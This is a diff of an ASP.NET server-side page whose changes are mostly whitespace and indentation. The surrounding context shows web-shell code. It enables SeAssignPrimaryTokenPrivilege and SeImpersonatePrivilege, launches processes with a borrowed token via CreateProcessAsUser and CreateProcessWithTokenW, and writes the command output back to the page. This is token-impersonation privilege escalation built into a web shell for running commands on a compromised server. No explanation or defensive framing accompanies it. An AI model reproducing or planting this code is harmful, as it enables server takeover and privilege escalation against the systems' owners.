@@ -7,7 +7,7 @@
 
 <script runat="server">
 
-	    public const int NO_ERROR = 0;
+    public const int NO_ERROR = 0;
 	public const int ERROR_INSUFFICIENT_BUFFER = 122;
 	public const int HANDLE_FLAG_INHERIT = 0x00000001;
 	public const int SE_PRIVILEGE_ENABLED = 0x00000002;
@@ -141,6 +141,7 @@
 	     public IntPtr hStdOutput;
 	     public IntPtr hStdError;
 	}
+	
 	public enum LogonFlags
 	{
 	     WithProfile = 1,
@@ -326,6 +327,7 @@
 	        final += System.Text.Encoding.Default.GetString(buf);
 	        buf = new byte[4096];
 	    }
+
 	    ResponseArea.InnerText = Regex.Replace(final,  @"[^\P{C}\n]+", "", RegexOptions.None);;
 
 		CloseHandle(out_read);
@@ -339,7 +341,6 @@
 	    IntPtr htok = IntPtr.Zero;
 	    retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
 	    
-	   
 	   	TokPriv1Luid tp;
 	    tp.Count = 1;
 	    tp.Luid = 0;
@@ -347,15 +348,15 @@
 	    if(!LookupPrivilegeValue(null, ASSIGN_PRIMARY_TOKEN, ref tp.Luid))
 	    {
 	        Response.Write("SeAssignPrimaryTokenPrivilege not found.");
-		CloseHandle(htok);
+			CloseHandle(htok);
 	        return false;
 	    }
 
 	    if(!AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero))
 	    {
 	        Response.Write("SeAssignPrimaryTokenPrivilege could not be enabled.");
-		CloseHandle(htok);
-		return false;
+			CloseHandle(htok);
+			return false;
 	    }
 
 		TokPriv1Luid tp2;
@@ -367,7 +368,7 @@
 	        AdjustTokenPrivileges(htok, false, ref tp2, 0, IntPtr.Zero, IntPtr.Zero);
 	    }
 	    
-	CloseHandle(htok);
+		CloseHandle(htok);
 
        	return CreateProcessAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
     }
@@ -385,9 +386,9 @@
 		LookupPrivilegeValue(null, IMPERSONATE, ref tp.Luid);
         AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
 	
-	CloseHandle(htok);
+		CloseHandle(htok);
         
-	return CreateProcessWithTokenW(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
+		return CreateProcessWithTokenW(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), ref si, out pi);
     }
 
 	protected void Refresh (object sender, EventArgs e)
